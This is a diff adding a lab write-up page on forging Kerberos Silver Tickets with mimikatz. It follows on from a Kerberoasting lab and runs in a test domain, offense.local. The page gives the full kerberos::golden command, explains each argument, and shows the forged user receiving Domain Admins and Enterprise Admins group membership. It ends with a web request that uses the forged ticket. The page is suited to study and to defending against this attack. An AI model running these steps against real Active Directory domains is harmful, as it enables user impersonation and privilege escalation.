@@ -1,0 +1,52 @@
+---
+description: Credential Access
+---
+
+# Kerberos Silver Tickets
+
+This lab looks at the technique of forging a cracked TGS Kerberos ticket in order to impersonate another user and escalate privileges.
+
+This lab builds on the lab [T1208: Kerberoasting](./) where a TGS ticket got crack cracked.
+
+## Execution
+
+I will be using mimikatz to create a Kerberos Silver Ticket - forging/rewriting the cracked ticket with some new details that benefit the me as an attacker. 
+
+Below is a table with values supplied to mimikatz explained and the command itseld:
+
+| Argument | Notes |
+| :--- | :--- |
+| /sid:S-1-5-21-4172452648-1021989953-2368502130-1105 | SID of the current user who is forging the ticket. Retrieved with `whoami /user` |
+| /target:dc-mantvydas.offense.local | server hosting the attacked service for which the TGS ticket was cracked |
+| /service:http | service type being attacked |
+| /rc4:a87f3a337d73085c45f9416be5787d86 | NTLM hash of the password the TGS ticket was encrypted with. `Passw0rd` in our case |
+| /user:beningnadmin | Forging the user name. This is the user name that will appear in the windows security logs - fun. |
+| /id:1155 | Forging user's RID |
+| /ptt | Instructs mimikatz to inject the forged ticket to memory to make it usable immediately |
+
+```csharp
+mimikatz # kerberos::golden /sid:S-1-5-21-4172452648-1021989953-2368502130-1105 /domain:offense.local /ptt /id:1155 /target:dc-mantvydas.offense.local /service:http /rc4:a87f3a337d73085c45f9416be5787d86 /user:beningnadmin
+```
+
+![Getting a user&apos;s SID](../../.gitbook/assets/silver-tickets-whoami.png)
+
+Creating the ticket with mimikatz and checking available tickets in memory with `klist` - note how the ticket specified our new client `benignadmin`
+
+![](../../.gitbook/assets/silver-tickets-generated-ticket%20%282%29.png)
+
+Note in the above mimikatz window the Group IDs which the fake user `benignadmin` is now a member of due to the forged ticket:
+
+| GID | Group Name |
+| :--- | :--- |
+| 512 | Domain Admins |
+| 513 | Domain Users |
+| 518 | Schema Admins |
+| 519 | Enterprise Admins |
+| 520 | Group Policy Creator Owners |
+
+![](../../.gitbook/assets/silver-tickets-groups.png)
+
+```csharp
+Invoke-WebRequest -UseBasicParsing -UseDefaultCredentials http://dc-mantvydas.offense.local
+```
+
